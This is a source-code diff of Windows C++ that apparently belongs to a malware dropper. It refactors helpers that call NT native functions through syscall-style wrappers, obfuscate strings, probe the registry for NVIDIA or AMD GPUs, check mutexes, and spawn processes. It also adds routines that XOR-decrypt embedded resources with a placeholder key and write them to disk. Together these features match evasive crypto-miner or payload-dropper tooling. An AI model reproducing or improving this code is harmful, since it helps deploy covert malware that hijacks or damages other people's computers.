@@ -3,7 +3,11 @@
 #include "ntddk.h"
 #include "obfuscateu.h"
 
-#include <wchar.h>
+void init_unicode_string(PUNICODE_STRING target_string, wchar_t* source_string, SIZE_T length) {
+    target_string->MaximumLength = (USHORT)(length * sizeof(WCHAR) + 1);
+    target_string->Length  = (USHORT)(wcslen(source_string) * sizeof(WCHAR));
+    target_string->Buffer = source_string;
+}
 
 PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags) {
 	/* 
@@ -58,15 +62,15 @@ PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLi
 
     wchar_t ntPath[MAX_PATH+4] = { 0 };
     combine_path(ntPath, AYU_OBFUSCATEW(L"\\??\\"), programPath);
-    INIT_UNICODE_STRING(nt_program_path, ntPath, MAX_PATH+4);
+    init_unicode_string(&nt_program_path, ntPath, MAX_PATH+4);
     if (startDir) {
-        INIT_UNICODE_STRING(start_directory, startDir, MAX_PATH);
+        init_unicode_string(&start_directory, startDir, MAX_PATH);
 	}
 	else {
 		start_directory = CurProcessParameters->CurrentDirectory.DosPath;
 	}
     if (cmdLine) {
-        INIT_UNICODE_STRING(command_line, cmdLine, MAX_COMMAND_LENGTH);
+        init_unicode_string(&command_line, cmdLine, MAX_COMMAND_LENGTH);
 	}
 	else {
 		command_line = nt_program_path;
@@ -74,10 +78,10 @@ PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLi
 
 	wchar_t emptyChar[1] = { 0 };
     if (runtimeData) {
-        INIT_UNICODE_STRING(ShellInfo, runtimeData, wcslen(runtimeData));
+        init_unicode_string(&ShellInfo, runtimeData, wcslen(runtimeData));
     }
     else {
-        INIT_UNICODE_STRING(ShellInfo, emptyChar, 1);
+        init_unicode_string(&ShellInfo, emptyChar, 1);
     }
 
     ULONG totalsize = 0;
@@ -140,9 +144,9 @@ PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLi
 
 bool has_gpu() {
     UNICODE_STRING regKey;
-    INIT_UNICODE_STRING(regKey, AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\"), MAX_PATH);
+    init_unicode_string(&regKey, AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\"), MAX_PATH);
     UNICODE_STRING providerKey;
-    INIT_UNICODE_STRING(providerKey, AYU_OBFUSCATEW(L"ProviderName"), MAX_PATH);
+    init_unicode_string(&providerKey, AYU_OBFUSCATEW(L"ProviderName"), MAX_PATH);
 
     HANDLE hKey = NULL;
     ULONG infoLength;
@@ -150,13 +154,14 @@ bool has_gpu() {
     BYTE valueBuffer[512];
     OBJECT_ATTRIBUTES attr;
     InitializeObjectAttributes(&attr, &regKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    if (NT_SUCCESS(UtOpenKey(&hKey, KEY_READ, &attr))) {
+    if (NT_SUCCESS(UtOpenKey(&hKey, KEY_ENUMERATE_SUB_KEYS, &attr))) {
         for (ULONG i = 0; UtEnumerateKey(hKey, i, KeyBasicInformation, subKeyBuffer, sizeof(subKeyBuffer), &infoLength) != STATUS_NO_MORE_ENTRIES; ++i) {
             HANDLE hSubKey;
-            INIT_UNICODE_STRING(regKey, ((PKEY_BASIC_INFORMATION)subKeyBuffer)->Name, ((PKEY_BASIC_INFORMATION)subKeyBuffer)->NameLength);
+            regKey.Buffer = ((PKEY_BASIC_INFORMATION)subKeyBuffer)->Name;
+            regKey.Length = (USHORT)((PKEY_BASIC_INFORMATION)subKeyBuffer)->NameLength;
+            regKey.MaximumLength = regKey.Length;
             InitializeObjectAttributes(&attr, &regKey, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hKey, NULL);
-            
-            if (NT_SUCCESS(UtOpenKey(&hSubKey, KEY_READ, &attr))) {
+            if (NT_SUCCESS(UtOpenKey(&hSubKey, KEY_QUERY_VALUE, &attr))) {
                 if (NT_SUCCESS(UtQueryValueKey(hSubKey, &providerKey, KeyValueFullInformation, valueBuffer, sizeof(valueBuffer), &infoLength))) {
                     wchar_t* providerName = (wchar_t*)((BYTE*)valueBuffer + ((PKEY_VALUE_FULL_INFORMATION)valueBuffer)->DataOffset);
                     if (wcsnicmp(providerName, AYU_OBFUSCATEW(L"NVIDIA"), 6) == 0 ||
@@ -177,19 +182,54 @@ bool has_gpu() {
     return false;
 }
 
+void format_string(wchar_t* dest, const wchar_t* format, va_list args) {
+    int len = wcslen(dest);
+    const wchar_t* p = format;
+    while (*p != L'\0' && len < MAX_COMMAND_LENGTH - 1) {
+        if (*p == L'%') {
+            p++;
+            if (*p == L'S') {
+                const wchar_t* arg = va_arg(args, wchar_t*);
+                while (*arg != L'\0' && len < MAX_COMMAND_LENGTH - 1) {
+                    dest[len++] = *arg++;
+                }
+            }
+        } else {
+            dest[len++] = *p;
+        }
+        p++;
+    }
+    dest[len] = L'\0';
+}
+
 void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...) {
     wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
     va_list argptr;
     va_start(argptr, cmdLine);
-    vswprintf(cmdLineFormatted, MAX_COMMAND_LENGTH, cmdLine, argptr);
+    format_string(cmdLineFormatted, cmdLine, argptr);
     va_end(argptr);
+
     PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLineFormatted, startDir, nullptr, 0, 0);
-	if(wait) {
+    if (wait) {
         LARGE_INTEGER waittime;
         waittime.QuadPart = -(30000 * 10000);
-		UtWaitForSingleObject(pi.hProcess, FALSE, &waittime);
-	}
-	UtClose(pi.hProcess);
+        UtWaitForSingleObject(pi.hProcess, FALSE, &waittime);
+    }
+    UtClose(pi.hProcess);
+}
+
+void cipher(unsigned char* data, ULONG datalen) {
+    for (int i = 0; i < datalen; ++i) {
+        data[i] = data[i] ^ AYU_OBFUSCATE("#CIPHERKEY")[i % 32];
+    }
+}
+
+void write_resource(unsigned char* resource_data, ULONG datalen, wchar_t* base_path, wchar_t* file) {
+    wchar_t path[MAX_PATH] = { 0 };
+    combine_path(path, base_path, file);
+    cipher(resource_data, datalen);
+    write_file(path, resource_data, datalen);
+    cipher(resource_data, datalen);
 }
 
 bool check_mutex(wchar_t* mutex) {
@@ -198,7 +238,7 @@ bool check_mutex(wchar_t* mutex) {
         HANDLE hMutex = NULL;
 
         UNICODE_STRING umutex;
-        INIT_UNICODE_STRING(umutex, mutex, MAX_PATH);
+        init_unicode_string(&umutex, mutex, MAX_PATH);
 
         OBJECT_ATTRIBUTES attr;
         InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);
@@ -260,12 +300,13 @@ HANDLE create_directory(wchar_t* dir_path) {
 }
 
 void create_recursive_directory(wchar_t* dir_path) {
+    wchar_t part_path[MAX_PATH];
+    memset(part_path, 0, sizeof(part_path));
+
     size_t len = wcslen(dir_path);
     for (size_t i = 0; i <= len; i++) {
+        part_path[i] = dir_path[i];
         if (dir_path[i] == L'\\' || dir_path[i] == L'/') {
-            wchar_t* part_path = new wchar_t[len + 1];
-            wcscpy(part_path, dir_path);
-            part_path[i] = L'\0';
             UtClose(create_directory(part_path));
         }
     }
@@ -396,10 +437,15 @@ bool write_file(wchar_t* file_path, PVOID paylad_buf, ULONG payload_size) {
 }
 
 bool delete_file(wchar_t* file_path) {
-    OBJECT_ATTRIBUTES attr = { 0 };
-    UNICODE_STRING unicode_path;
-    ntpath_obj_attr(&attr, &unicode_path, file_path);
-    return NT_SUCCESS(UtDeleteFile(&attr));
+    HANDLE hDelFile = open_file(file_path, false);
+
+    IO_STATUS_BLOCK status_block = { 0 };
+    FILE_DISPOSITION_INFORMATION info = { 0 };
+    info.DeleteFile = TRUE;
+
+    NTSTATUS success = NT_SUCCESS(UtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation));
+    UtClose(hDelFile);
+    return success;
 }
 
 bool check_file_exists(wchar_t* file_path) {
@@ -421,30 +467,9 @@ bool check_administrator() {
     return false;
 }
 
-bool set_value_registry(wchar_t* key, wchar_t* value, ULONG type, PVOID data, ULONG datasize) {
-    UNICODE_STRING ukey;
-    INIT_UNICODE_STRING(ukey, key, MAX_PATH);
-
-    OBJECT_ATTRIBUTES attr;
-    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-    bool success = false;
-
-    ULONG vDisp = 0;
-    HANDLE hKey = NULL;
-    if (NT_SUCCESS(UtCreateKey(&hKey, KEY_WRITE, &attr, 0, NULL, REG_OPTION_NON_VOLATILE, &vDisp))) {
-        UNICODE_STRING uvalue;
-        INIT_UNICODE_STRING(uvalue, value, MAX_PATH);
-
-        success = NT_SUCCESS(UtSetValueKey(hKey, &uvalue, 0, type, data, datasize));
-    }
-    UtClose(hKey);
-    return success;
-}
-
 bool check_key_registry(wchar_t* key) {
     UNICODE_STRING ukey;
-    INIT_UNICODE_STRING(ukey, key, MAX_PATH);
+    init_unicode_string(&ukey, key, MAX_PATH);
     OBJECT_ATTRIBUTES attr;
     InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -456,10 +481,10 @@ bool check_key_registry(wchar_t* key) {
 
 bool rename_key_registry(wchar_t* current_key, wchar_t* new_key) {
     UNICODE_STRING ukey;
-    INIT_UNICODE_STRING(ukey, current_key, MAX_PATH);
+    init_unicode_string(&ukey, current_key, MAX_PATH);
 
     UNICODE_STRING unewkey;
-    INIT_UNICODE_STRING(unewkey, new_key, MAX_PATH);
+    init_unicode_string(&unewkey, new_key, MAX_PATH);
 
     OBJECT_ATTRIBUTES attr;
     InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);
@@ -469,23 +494,6 @@ bool rename_key_registry(wchar_t* current_key, wchar_t* new_key) {
     HANDLE hKey = NULL;
     if (NT_SUCCESS(UtOpenKey(&hKey, KEY_WRITE | KEY_CREATE_SUB_KEY | DELETE, &attr))) {
         success = NT_SUCCESS(UtRenameKey(hKey, &unewkey));
-    }
-    UtClose(hKey);
-    return success;
-}
-
-bool delete_key_registry(wchar_t* key) {
-    UNICODE_STRING ukey;
-    INIT_UNICODE_STRING(ukey, key, MAX_PATH);
-
-    OBJECT_ATTRIBUTES attr;
-    InitializeObjectAttributes(&attr, &ukey, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-    bool success = false;
-
-    HANDLE hKey = NULL;
-    if (NT_SUCCESS(UtOpenKey(&hKey, DELETE, &attr))) {
-        success = NT_SUCCESS(UtDeleteKey(hKey));
     }
     UtClose(hKey);
     return success;
